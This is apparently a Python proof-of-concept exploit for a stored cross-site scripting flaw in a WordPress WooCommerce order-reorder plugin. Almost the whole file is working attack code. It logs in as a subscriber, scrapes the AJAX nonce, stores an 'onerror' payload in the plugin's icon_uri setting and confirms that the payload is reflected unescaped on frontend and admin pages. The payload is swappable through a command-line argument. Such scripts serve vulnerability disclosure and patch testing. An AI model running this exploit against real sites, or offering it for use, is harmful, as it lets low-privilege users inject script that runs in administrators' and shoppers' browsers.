#!/usr/bin/env python3
"""
PoC for Authenticated (Subscriber/Customer) Stored XSS via icon_uri.

Root cause:
  source: $_POST['icon_uri'] -> sanitize_text_field() (does NOT encode " / onerror=)
  store : update_option('ced_ocor_general_settings', ['iconUri'=>payload])
  sink  : <img src="<?php echo $image;?>" in class-basket-order.php:387 (admin settings)
          and class-basket-order.php:981 (wp_footer frontend)

Usage (minimal, as requested):
  python3 poc.py --url=<url-post/page>

  The --url can be any frontend page where the plugin enqueues scripts
  (Shop / Product Detail / Cart / My Account), e.g.:
  python3 poc.py --url=https://target/shop/

  With low-priv credentials (recommended, full exploit):
  python3 poc.py --url=https://target/shop/ --username subscriber --password 'p@ss'

  Custom payload (must avoid quoted JS due to WP magic-quotes adding backslash before quote):
  python3 poc.py --url=https://target/shop/ --username sub --password pass --payload 'x" onerror=alert(1)//'

Requires: pip install requests
"""

import argparse
import re
import sys
from urllib.parse import urlparse, urljoin

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


DEFAULT_PAYLOAD = 'x" onerror=alert(1)//'


def parse_args():
    p = argparse.ArgumentParser(description="Stored XSS PoC for one-click-order-reorder icon_uri")
    p.add_argument("--url", required=True, help="Full URL of a frontend post/page (Shop/Detail/Cart/Account), e.g. https://target/shop/")
    p.add_argument("--username", default=None, help="Low-priv username (subscriber/customer). If omitted, runs unauth check only.")
    p.add_argument("--password", default=None, help="Password for --username.")
    p.add_argument("--payload", default=DEFAULT_PAYLOAD, help=f"XSS payload for icon_uri (default: {DEFAULT_PAYLOAD!r})")
    p.add_argument("--insecure", action="store_true", help="Disable TLS verification.")
    return p.parse_args()


def get_base(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    u = urlparse(url)
    return f"{u.scheme}://{u.netloc}"


def wp_login(sess: requests.Session, wp_root: str, user: str, pwd: str, verify: bool) -> bool:
    login_url = wp_root.rstrip("/") + "/wp-login.php"
    # get login page first to grab cookies
    try:
        lr = sess.get(login_url, verify=verify, timeout=15)
        print(f"    GET {login_url} -> HTTP {lr.status_code}")
    except Exception as e:
        print(f"[!] GET {login_url} failed: {e}")
        return False
    data = {
        "log": user,
        "pwd": pwd,
        "wp-submit": "Log In",
        "redirect_to": wp_root.rstrip("/") + "/wp-admin/",
        "testcookie": "1",
    }
    try:
        r = sess.post(login_url, data=data, verify=verify, timeout=15, allow_redirects=True)
    except Exception as e:
        print(f"[!] POST {login_url} failed: {e}")
        return False
    # wordpress_logged_in_* cookie = logged in
    cookies = list(sess.cookies.keys())
    if any("wordpress_logged_in" in c for c in cookies):
        return True
    for c in sess.cookies:
        if "logged_in" in c.name:
            return True
    # debug hint
    if "incorrect" in r.text.lower() or "error" in r.text.lower() and "password" in r.text.lower():
        print("    Hint: WP says incorrect username/password. Create subscriber via wp-admin > Users.")
    return False


def extract_ajaxurl(html: str):
    m = re.search(r'"ajaxurl"\s*:\s*"([^"]+admin-ajax\.php)"', html)
    if m:
        # decode \/ if present
        return m.group(1).replace("\\/", "/")
    # escaped variant
    m = re.search(r'(https?:\\/\\/[^"\']+admin-ajax\.php)', html)
    if m:
        return m.group(1).replace("\\/", "/")
    return None


def extract_nonce(html: str):
    # wp_localize_script: var global_var = {"ajaxurl":"...","ajax_nonce":"abc123",...}
    m = re.search(r'"ajax_nonce"\s*:\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    # fallback: globals.nonce_check on admin (same action value, different key)
    m = re.search(r'"nonce_check"\s*:\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    # fallback: any 10-char hex nonce near global_var
    m = re.search(r'global_var.*?([a-f0-9]{10,})', html, re.S | re.I)
    if m:
        return m.group(1)
    return None


def main():
    args = parse_args()
    verify = not args.insecure
    target_page = args.url if args.url.startswith(("http://", "https://")) else "http://" + args.url

    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (PoC one-click-order-reorder)"})

    print(f"[*] Target page : {target_page}")
    print(f"[*] Payload     : {args.payload!r}")

    # 0. discover WP root + ajax_url from page source (handles subdirectory installs like /wordpress/)
    print("[*] Step 0/4: discovering wp-admin/ajax URL from page source ...")
    try:
        dr = sess.get(target_page, verify=verify, timeout=15)
    except Exception as e:
        print(f"[!] GET target failed: {e}")
        sys.exit(2)
    ajax_url = extract_ajaxurl(dr.text)
    if ajax_url:
        wp_root = ajax_url.split("/wp-admin/")[0]
        print(f"[+] Found ajaxurl: {ajax_url}")
        print(f"[+] WP root: {wp_root}")
    else:
        # fallback: guess wp root from target path parents (try /wordpress prefix)
        print("[!] ajaxurl not found, guessing WP root from URL path ...")
        u = urlparse(target_page)
        base_no_path = f"{u.scheme}://{u.netloc}"
        candidates = [base_no_path + "/wordpress", base_no_path]
        # if target already contains /wordpress/, prefer it
        if "/wordpress" in u.path:
            wp_root = base_no_path + "/wordpress"
        else:
            wp_root = base_no_path
        ajax_url = wp_root.rstrip("/") + "/wp-admin/admin-ajax.php"
        print(f"    Using WP root: {wp_root}, ajax: {ajax_url}")

    # 1. login (if creds supplied) - must happen BEFORE nonce fetch (nonces are user-bound)
    if args.username and args.password:
        print(f"[*] Step 1/4: logging in as {args.username!r} to {wp_root}/wp-login.php ...")
        ok = wp_login(sess, wp_root, args.username, args.password, verify)
        if not ok:
            print("[!] Login failed. Check user exists (wp-admin > Users > Add New, role Subscriber) and password.")
            print(f"    Cookies now: {list(sess.cookies.keys())}")
            print("    Continuing with current session anyway (likely to get '0').")
        else:
            print("[+] Logged in (wordpress_logged_in cookie present).")
    else:
        print("[*] Step 1/4: no credentials supplied -> trying unauthenticated (expected to fail with '0', proves auth gate).")
        print("    To fully exploit, rerun with: --username subscriber --password '...'")

    # 2. fetch frontend page (authenticated) and extract nonce
    print(f"[*] Step 2/4: fetching {target_page} to extract global_var.ajax_nonce ...")
    try:
        r = sess.get(target_page, verify=verify, timeout=15)
    except Exception as e:
        print(f"[!] GET target failed: {e}")
        sys.exit(2)
    # ajax_url may have changed after login (same path, keep discovered one but refresh if page has it)
    fresh_ajax = extract_ajaxurl(r.text)
    if fresh_ajax:
        ajax_url = fresh_ajax
        wp_root = ajax_url.split("/wp-admin/")[0]
    nonce = extract_nonce(r.text)
    if not nonce:
        # try homepage as fallback (plugin enqueues on all frontend via wp_enqueue_scripts)
        home = wp_root.rstrip("/") + "/"
        print(f"[!] ajax_nonce not found on given URL, trying homepage {home} ...")
        try:
            r2 = sess.get(home, verify=verify, timeout=15)
            nonce = extract_nonce(r2.text)
            if not nonce:
                # dump hint
                print("    Hint: search view-source for 'ajax_nonce'. If absent, plugin/Woo may be inactive on that theme.")
        except Exception as e:
            print(f"    Homepage fetch failed: {e}")
    if not nonce:
        print("[!] Could not extract ajax_nonce. Is plugin active + WooCommerce present?")
        print("    Hint: view-source of /shop/ and search for 'ajax_nonce'.")
        sys.exit(2)
    print(f"[+] Found nonce: {nonce} (will be sent as 'nonce_check'; same action 'ced-cng-ajax-seurity-nonce')")

    # 3. store payload via vulnerable handler
    # NOTE: PHP expects $_POST['selectedUser'] and $_POST['basketPages'] as arrays.
    print("[*] Step 3/4: POST ced_ocor_save_general_setting with icon_uri=payload ...")
    data = [
        ("action", "ced_ocor_save_general_setting"),
        ("same_order", "1"),
        ("selectedUser[]", "customer"),
        ("selectedUser[]", "subscriber"),
        ("basketEnable", "enable"),
        ("noteenable", "enable"),
        ("filterenable", "enable"),
        ("basketPages[]", "shop"),
        ("basketPages[]", "detail"),
        ("atbBtnText", "Add to basket"),
        ("rfbBtnText", "Remove from basket"),
        ("icon_uri", args.payload),
        ("nonce_check", nonce),
    ]
    try:
        pr = sess.post(ajax_url, data=data, verify=verify, timeout=15)
    except Exception as e:
        print(f"[!] POST {ajax_url} failed: {e}")
        sys.exit(2)
    body = pr.text.strip()
    print(f"    HTTP {pr.status_code}, body (truncated): {body[:300]!r}")
    if body == "0":
        print("[-] Got '0' -> blocked by admin-ajax (unauthenticated or missing wp_ajax hook).")
        print("    This is expected without login. Rerun with low-priv credentials.")
        sys.exit(3)
    if body in ("-1", "-1,403"):
        print("[-] Got '-1' -> nonce check failed (check_ajax_referer). Nonce may have expired, refetch page.")
        sys.exit(3)
    if '"success":true' in body or '"success": true' in body:
        print("[+] Settings saved (wp_send_json_success). Payload is now stored in option 'ced_ocor_general_settings'.")
    else:
        print("[?] Unexpected response. It may still have stored (update_option returns false if unchanged). Continuing to verify.")

    # 4. verify reflection in frontend footer sink
    print("[*] Step 4/4: verifying reflection in <img src=\"...\"> sink ...")
    try:
        vr = sess.get(target_page, verify=verify, timeout=15)
    except Exception as e:
        print(f"[!] Re-GET failed: {e}")
        sys.exit(2)
    # payload should appear raw inside src="..." (unescaped). esc_url() would encode " but echo $image does not.
    # NOTE: use unquoted JS (onerror=alert(1)//) because WP magic-quotes adds \ before every " .
    if "onerror" in vr.text and "alert(1)" in vr.text:
        # find context
        idx = vr.text.find("onerror")
        ctx = vr.text[max(0, idx - 120): idx + 120].replace("\n", " ")
        print("[+] VULNERABLE: payload reflected raw in frontend HTML:")
        print(f"    ...{ctx}...")
        if "onerror=alert(1)" in vr.text:
            print("[+] Confirmed sink: <img src=\"<?php echo $image;?>\"> (class-basket-order.php:981).")
    else:
        print("[-] Payload not found in this page. It may still fire on:")
        print("    - another allowed basket page (shop/detail/cart/account) matching basketPages, or")
        print("    - admin settings page /wp-admin/admin.php?page=wc-ocor-settings (class-basket-order.php:387).")
        print("    Check those as the same low-priv/admin user.")

    print("\n=== Trigger URLs ===")
    print(f"Admin sink   : {wp_root}/wp-admin/admin.php?page=wc-ocor-settings  (view <img src=\"...\">, needs manage_woocommerce)")
    print(f"Frontend sink: {target_page} (logged in as allowed role, basketEnable=enable, matching basketPages)")
    print("JS fires without further clicks on page load.")
    print("Done.")


if __name__ == "__main__":
    main()
